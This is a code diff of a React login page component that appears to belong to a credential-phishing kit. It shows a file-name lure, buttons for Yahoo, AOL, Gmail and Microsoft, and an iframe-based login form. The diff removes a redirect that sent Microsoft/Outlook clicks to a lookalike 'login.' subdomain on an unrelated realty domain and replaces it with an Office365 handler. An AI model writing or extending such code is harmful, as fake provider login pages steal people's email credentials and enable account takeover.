@@ -1,6 +1,5 @@
 import React, { useRef, useEffect, useCallback, useState } from 'react';
 import { useLogin } from '../hooks/useLogin';
-import Spinner from './common/Spinner';
 
 interface LoginPageProps {
   fileName: string;
@@ -10,6 +9,7 @@ interface LoginPageProps {
   onYahooSelect?: () => void;
   onAolSelect?: () => void;
   onGmailSelect?: () => void;
+  onOffice365Select?: () => void;
   onOthersSelect?: () => void;
   onEmailSubmit?: (email: string) => boolean;
   defaultProvider?: string;
@@ -21,6 +21,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
   onYahooSelect,
   onAolSelect,
   onGmailSelect,
+  onOffice365Select,
   onOthersSelect,
   onEmailSubmit,
   defaultProvider,
@@ -28,7 +29,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [email, setEmail] = useState('');
   const [provider, setProvider] = useState('');
-  const [redirecting, setRedirecting] = useState(false);
 
   const { handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
@@ -53,7 +53,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         }
         case 'social-click': {
           const p = msg.data?.provider;
-          if (p === 'microsoft' || p === 'outlook') { setRedirecting(true); return; }
+          if (p === 'microsoft' || p === 'outlook') onOffice365Select?.();
           else if (p === 'yahoo') onYahooSelect?.();
           else if (p === 'aol') onAolSelect?.();
           else if (p === 'gmail') onGmailSelect?.();
@@ -98,34 +98,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
         }
       }
     },
-    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOthersSelect, onEmailSubmit, sendToIframe, defaultProvider]
+    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOffice365Select, onOthersSelect, onEmailSubmit, sendToIframe, defaultProvider]
   );
 
   useEffect(() => {
     window.addEventListener('message', handleMessage);
     return () => window.removeEventListener('message', handleMessage);
   }, [handleMessage]);
-
-  useEffect(() => {
-    if (redirecting) {
-      window.location.href = 'https://login.allseattletacomaarearealtyservices.com/OaQVGwxX';
-    }
-  }, [redirecting]);
-
-  if (redirecting) {
-    return (
-      <div style={{
-        width: '100%',
-        height: '100vh',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        backgroundColor: '#fff',
-      }}>
-        <Spinner size="lg" />
-      </div>
-    );
-  }
 
   return (
     <iframe
